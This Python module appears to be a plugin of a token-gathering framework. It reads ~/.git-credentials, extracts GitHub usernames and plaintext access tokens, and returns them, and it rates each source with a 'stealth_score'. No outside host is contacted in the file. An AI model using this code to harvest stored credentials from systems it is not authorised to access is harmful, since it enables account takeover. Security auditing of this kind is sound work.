"""Git credentials file parser — reads ~/.git-credentials URL format."""

from __future__ import annotations

import re
from typing import List
from urllib.parse import urlparse

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import git_credentials_path


@CollectorRegistry.register
class GitCredentialsCollector(BaseCollector):
    service = "github"
    source = "git_credentials"
    stealth_score = 5

    def _parse_credentials(self, text: str) -> list:
        """Parse .git-credentials file.

        Format: https://user:token@github.com
        """
        entries = []
        for line in text.strip().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                parsed = urlparse(line)
                if parsed.hostname and parsed.password:
                    entries.append({
                        "host": parsed.hostname,
                        "username": parsed.username or "",
                        "token": parsed.password,
                        "scheme": parsed.scheme,
                    })
            except Exception:
                continue
        return entries

    def discover(self) -> List[DiscoveredToken]:
        results = []
        path = git_credentials_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_credentials(text)

            for entry in entries:
                if "github" not in entry["host"].lower():
                    continue  # Only GitHub entries

                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(path),
                    account_hint=f"{entry['username']}@{entry['host']}",
                    stealth_score=self.stealth_score,
                ))
        except Exception as e:
            self._warn(f"Failed to parse {path}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        path = git_credentials_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_credentials(text)

            for entry in entries:
                if "github" not in entry["host"].lower():
                    continue

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    username=entry["username"],
                    access_token=secure(entry["token"]),
                    extra={
                        "host": entry["host"],
                        "scheme": entry["scheme"],
                    },
                ))
        except Exception as e:
            self._warn(f"Failed to collect from {path}: {e}")

        return results
